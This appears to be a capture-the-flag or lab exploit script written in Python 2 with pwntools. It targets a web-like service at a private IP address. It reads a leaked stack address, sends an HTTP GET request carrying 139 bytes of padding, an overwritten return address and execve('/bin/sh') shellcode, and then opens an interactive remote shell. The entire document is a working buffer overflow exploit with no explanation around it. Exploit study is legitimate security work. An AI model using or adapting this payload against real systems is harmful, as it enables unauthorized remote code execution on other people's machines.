from pwn import *

r = remote('192.168.1.110', 20000)
context.log_level = 'debug'

sc = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
padding = "A"*139

leak = r.recvuntil(':-)')[21:31]
leak2 = int(leak,16)
print 'leak:', leak2

pay = ''
pay += 'GET '
pay += padding
pay += p32(leak2+156)
pay += ' HTTP/1.1'
pay += sc

r.sendline(pay)

r.interactive()
